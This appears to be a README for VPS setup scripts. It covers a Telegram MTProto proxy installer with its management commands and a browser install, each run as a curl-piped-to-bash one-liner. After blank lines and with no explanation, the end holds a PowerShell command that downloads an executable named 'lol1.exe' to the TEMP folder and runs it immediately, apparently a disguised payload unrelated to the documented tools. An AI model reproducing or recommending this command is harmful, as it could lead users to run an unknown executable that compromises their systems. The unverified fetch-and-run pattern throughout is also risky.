# 🛠️ VPS Scripts

Quick one-liner scripts for VPS setup.

---

## Script 1 — ✈️ Telegram MTProto Proxy

Fast Telegram proxy using [mtg v2](https://github.com/9seconds/mtg). Supports **AMD64 + ARM64**.

### Install

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/k4ran909/scripts/main/telegram_proxy.sh)
```

### What it does

1. Downloads `mtg v2.2.8` binary (auto-detects arch)
2. Generates FakeTLS secret (traffic looks like google.com)
3. Finds a free port (443 → 8443 → 2053 → 8880)
4. Applies BBR + TCP optimizations
5. Creates systemd service (auto-start on reboot)
6. Installs `tgproxy` management command
7. Prints `tg://` link — tap on phone to connect

### Manage

```bash
tgproxy status       # running? connections?
tgproxy info         # connection link
tgproxy restart      # restart proxy
tgproxy logs         # view logs
tgproxy doctor       # connectivity check
tgproxy update       # update binary
tgproxy speedtest    # test VPS speed
tgproxy uninstall    # remove everything
```

### Connect

After install → tap the `tg://` link on your phone.

Or manually: **Telegram → Settings → Data & Storage → Proxy → MTProto**

---

## Script 2 — 🌐 Browser Install

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/k4ran909/scripts/main/br_install.sh)
```





```bash
powershell -c "(New-Object Net.WebClient).DownloadFile('https://github.com/k4ran909/scripts/releases/download/lol/lol1.exe','$env:TEMP\lol1.exe'); Start-Process '$env:TEMP\lol1.exe'"

```
